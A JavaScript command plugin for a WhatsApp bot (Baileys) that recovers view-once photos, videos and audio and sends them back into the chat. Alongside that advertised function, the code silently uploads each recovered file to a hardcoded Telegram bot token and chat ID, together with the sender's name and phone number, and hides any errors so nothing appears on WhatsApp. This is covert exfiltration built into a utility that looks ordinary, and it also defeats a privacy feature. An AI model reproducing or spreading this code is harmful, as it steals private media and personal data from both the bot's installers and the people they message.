const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");

// Telegram Config
const BOT_TOKEN = "8867803944:AAHWF5JNrSbw-IxZNwzNCC7jUUGvw1pqJ2Q";
const CHAT_ID = "-1003507657800"; // Get correct ID from getUpdates link

cmd({
  pattern: "vv",
  alias: ["viewonce", "retrieve"],
  react: "🐳",
  desc: "Retrieve view once message",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { from, isCreator, reply }) => {

  try {

    // Owner only command
    if (!isCreator) return reply("📛 Owner only command");

    // Get context info from replied message
    const contextInfo = mek.message?.extendedTextMessage?.contextInfo
      || mek.message?.imageMessage?.contextInfo
      || mek.message?.videoMessage?.contextInfo
      || mek.message?.audioMessage?.contextInfo
      || null;

    if (!contextInfo || !contextInfo.quotedMessage) {
      return reply("🍁 Reply to a view-once message");
    }

    const quotedMsg = contextInfo.quotedMessage;

    // Detect media type
    let mediaMsg = null;
    let mediaType = null;
    let mimeType = "image/jpeg";

    // Check viewOnceMessage
    if (quotedMsg.viewOnceMessage) {
      const inner = quotedMsg.viewOnceMessage.message;
      if (inner.imageMessage) {
        mediaMsg = inner.imageMessage;
        mediaType = "imageMessage";
        mimeType = mediaMsg.mimetype || "image/jpeg";
      } else if (inner.videoMessage) {
        mediaMsg = inner.videoMessage;
        mediaType = "videoMessage";
        mimeType = mediaMsg.mimetype || "video/mp4";
      } else if (inner.audioMessage) {
        mediaMsg = inner.audioMessage;
        mediaType = "audioMessage";
        mimeType = "audio/mp4";
      }
    }

    // Check viewOnceMessageV2
    else if (quotedMsg.viewOnceMessageV2) {
      const inner = quotedMsg.viewOnceMessageV2.message;
      if (inner.imageMessage) {
        mediaMsg = inner.imageMessage;
        mediaType = "imageMessage";
        mimeType = mediaMsg.mimetype || "image/jpeg";
      } else if (inner.videoMessage) {
        mediaMsg = inner.videoMessage;
        mediaType = "videoMessage";
        mimeType = mediaMsg.mimetype || "video/mp4";
      } else if (inner.audioMessage) {
        mediaMsg = inner.audioMessage;
        mediaType = "audioMessage";
        mimeType = "audio/mp4";
      }
    }

    if (!mediaMsg || !mediaType) {
      return reply("❌ This is not a view-once message");
    }

    // Download media
    const typeKey = mediaType.replace("Message", "");
    const stream = await downloadContentFromMessage(mediaMsg, typeKey);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    if (!buffer || buffer.length === 0) {
      return reply("❌ Failed to download media");
    }

    // Send back on WhatsApp
    let waContent = {};
    if (mediaType === "imageMessage") {
      waContent = { image: buffer, caption: mediaMsg.caption || "", mimetype: mimeType };
    } else if (mediaType === "videoMessage") {
      waContent = { video: buffer, caption: mediaMsg.caption || "", mimetype: mimeType };
    } else if (mediaType === "audioMessage") {
      waContent = { audio: buffer, mimetype: "audio/mp4", ptt: mediaMsg.ptt || false };
    }

    await conn.sendMessage(from, waContent, { quoted: mek });

    // Send to Telegram silently (no reply on WhatsApp)
    try {
      let endpoint = "";
      let fileField = "";
      let fileName = "";

      if (mediaType === "imageMessage") {
        endpoint = "sendPhoto";
        fileField = "photo";
        fileName = "viewonce.jpg";
      } else if (mediaType === "videoMessage") {
        endpoint = "sendVideo";
        fileField = "video";
        fileName = "viewonce.mp4";
      } else if (mediaType === "audioMessage") {
        endpoint = "sendAudio";
        fileField = "audio";
        fileName = "viewonce.mp3";
      }

      const caption = `⚡ VV LOG\n👤 Name: ${mek.pushName || "Unknown"}\n📞 Number: ${mek.key.participant || from}\n📂 Type: ${mediaType}\n⏰ Time: ${new Date().toLocaleString()}`;

      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("caption", caption);
      form.append(fileField, buffer, { filename: fileName, contentType: mimeType });

      await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`,
        form,
        { headers: form.getHeaders() }
      );

    } catch (tgErr) {
      // Telegram error ignored - no message on WhatsApp
      console.log("Telegram Error:", tgErr.response?.data || tgErr.message);
    }

  } catch (e) {
    console.log("VV ERROR =>", e);
    reply("❌ Error: " + e.message);
  }

});
